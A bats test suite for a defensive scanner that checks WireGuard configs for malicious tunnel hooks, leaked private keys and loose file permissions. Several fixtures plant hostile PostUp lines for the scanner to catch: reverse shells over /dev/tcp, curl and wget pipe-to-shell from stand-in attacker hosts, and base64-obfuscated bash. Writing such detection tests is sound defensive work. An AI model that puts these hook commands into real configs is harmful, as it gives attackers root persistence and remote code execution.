#!/usr/bin/env bats
# L2 bats functional tests for the wireguard-config-watchdog scan script.
#
# wg-quick runs the PostUp/PreUp/PostDown/PreDown directives in each
# /etc/wireguard/*.conf AS ROOT on tunnel up/down — a planted hook is
# root-exec-on-tunnel-event persistence (T1546). Because each .conf holds the
# [Interface] PrivateKey, a world-readable .conf is private-key exposure
# (T1552.001). A .conf that is world-writable / non-root-owned, world-readable
# while carrying a PrivateKey, or whose hook command carries an injection
# pattern (incl. a writable-root path), is alert.
#
# wg .conf files are 0600 by convention; printf-created files default to a
# world-readable mode, so benign baselines are chmod 0600 explicitly.
#
# Run with: bats packaging/test/L2-wireguard-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/wireguard-config-watchdog/systemd/wireguard-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    WGD="${TMP}/wireguard"; mkdir -p "${WGD}"
    CONF="${WGD}/wg0.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_WIREGUARD_PROFILE="${PROFILE:-report}" \
    SELFDEF_WIREGUARD_BASELINE="${BASELINE}" \
    SELFDEF_WIREGUARD_DIRS="${DIRS_V:-$WGD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# Benign 0600 config with a PrivateKey + a benign PostUp.
seed_benign() {
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWxfMDAwMDAwMDAwMDA=\nAddress = 10.0.0.2/24\nPostUp = wg set %%i fwmark 51820\n' > "${CONF}"
    chmod 0600 "${CONF}"
}

@test "no wireguard configs → ok / no_wireguard" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_wireguard"'
    cap | grep -q '"severity":"ok"'
}

@test "benign 0600 config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / wireguard_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"wireguard_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a PostUp hook with an injection pattern → alert / wireguard_suspicious" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"wireguard_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a PostUp hook under a writable root → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /tmp/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-readable config holding a PrivateKey → alert (key exposure)" {
    seed_benign
    run_wd
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign config change → warn / wireguard_changed" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWxfMDAwMDAwMDAwMDA=\nAddress = 10.0.0.3/24\nPostUp = wg set %%i fwmark 51820\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"wireguard_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign 0600 config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious PostUp hook" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /tmp/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — wireguard config inventory enumerates tunnel-event-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (PostUp under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /var/tmp/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PreUp directive — symmetric to PostUp): writable-root → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPreUp = /tmp/.preup\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PostDown directive — symmetric to PostUp): writable-root → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostDown = /tmp/.postdown\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in PostUp): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = wget -qO- http://attacker/p | sh\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in PostUp): obfuscation → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-wireguard -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): wireguard-config-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 tunnel-event-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"wireguard_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PreDown directive — full 4-axis hook coverage with PreUp/PostUp/PostDown)" {
    # The 4 hook directives are PreUp/PostUp/PreDown/PostDown. Existing
    # tests cover 3; lock the 4th (PreDown) too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPreDown = /tmp/.predown\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PostUp under /dev/shm — tmpfs writable-root coverage on hook axis)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /dev/shm/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in PostUp)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = curl -s http://attacker.com/p | bash\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}
